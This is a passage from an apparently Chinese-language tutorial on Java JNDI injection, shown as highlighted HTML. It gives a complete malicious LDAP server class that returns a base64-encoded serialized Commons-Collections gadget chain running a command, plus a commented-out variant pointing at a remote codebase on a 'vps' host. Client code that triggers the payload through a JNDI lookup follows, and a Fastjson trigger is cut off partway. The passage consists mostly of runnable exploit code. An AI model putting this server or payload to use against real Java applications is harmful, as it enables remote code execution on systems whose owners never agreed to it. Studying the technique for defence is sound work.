+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;commons-collections&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;3.2.1&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
+</li>
+<li><p><strong>恶意服务器</strong></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.util.Base64</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.sdk.Entry</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.sdk.LDAPException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.sdk.LDAPResult</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.unboundid.ldap.sdk.ResultCode</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.net.ServerSocketFactory</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.net.SocketFactory</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.net.ssl.SSLSocketFactory</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.net.InetAddress</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.net.MalformedURLException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.net.URL</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.text.ParseException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JNDIGadgetServer</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> LDAP_BASE </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;dc=example,dc=com&quot;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">url</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;http://vps:8000/#ExportObject&quot;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">port</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1234</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">InMemoryDirectoryServerConfig</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">config</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InMemoryDirectoryServerConfig</span><span style="color: #ABB2BF">(LDAP_BASE);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">config</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setListenerConfigs</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InMemoryListenerConfig</span><span style="color: #ABB2BF">(</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #98C379">&quot;listen&quot;</span><span style="color: #ABB2BF">,</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">InetAddress</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getByName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;0.0.0.0&quot;</span><span style="color: #ABB2BF">),</span></span>
+<span class="line"><span style="color: #ABB2BF">                    port,</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">ServerSocketFactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDefault</span><span style="color: #ABB2BF">(),</span></span>
+<span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">SocketFactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDefault</span><span style="color: #ABB2BF">(),</span></span>
+<span class="line"><span style="color: #ABB2BF">                    (SSLSocketFactory) </span><span style="color: #E5C07B">SSLSocketFactory</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDefault</span><span style="color: #ABB2BF">()));</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">config</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addInMemoryOperationInterceptor</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OperationInterceptor</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(url)));</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">InMemoryDirectoryServer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ds</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InMemoryDirectoryServer</span><span style="color: #ABB2BF">(config);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Listening on 0.0.0.0:&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> port);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">ds</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">startListening</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> ( </span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF"> ) {</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">OperationInterceptor</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">InMemoryOperationInterceptor</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">URL</span><span style="color: #E06C75"> codebase</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> OperationInterceptor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">cb</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">codebase</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> cb;</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> processSearchResult</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">InMemoryInterceptedSearchResult</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">result</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">base</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">result</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRequest</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getBaseDN</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">Entry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">e</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Entry</span><span style="color: #ABB2BF">(base);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #61AFEF">sendResult</span><span style="color: #ABB2BF">(result, base, e);</span></span>
+<span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e1</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">e1</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">protected</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> sendResult</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">InMemoryInterceptedSearchResult</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">result</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">base</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Entry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">LDAPException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">MalformedURLException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">turl</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">codebase</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">codebase</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRef</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">replace</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;.&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&#39;/&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">concat</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;.class&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Send LDAP reference result for &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> base </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot; redirecting to &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> turl);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;javaClassName&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;Exploit&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">cbstring</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">codebase</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">refPos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">cbstring</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">indexOf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;#&#39;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (refPos </span><span style="color: #56B6C2">&gt;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                cbstring </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">cbstring</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">substring</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, refPos);</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//            Payload1: 利用LDAP+Reference Factory</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//            Payload2: 返回序列化Gadget</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF"> {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;javaSerializedData&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Base64</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">            } </span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">ParseException</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">exception</span><span style="color: #ABB2BF">) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">exception</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">result</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">sendSearchEntry</span><span style="color: #ABB2BF">(e);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">result</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setResult</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LDAPResult</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">ResultCode</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">SUCCESS</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">}</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p><strong>客户端触发</strong></p>
+<p>lookup参数注入触发</p>
+<figure class="shiki Java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre><code>package org.example;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+
+public class JNDIGadgetClient {
+    public static void main(String[] args) throws Exception {
+        // lookup参数注入触发
+        Context context = new InitialContext();
+        context.lookup("ldap://localhost:1234/ExportObject");
+
+    }
+}</code></pre></div></div></figure>
+
+<p>  Fastjson反序列化JNDI注入Gadget触发</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">com.alibaba.fastjson.JSON</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.Context</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.InitialContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JNDIGadgetClient</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
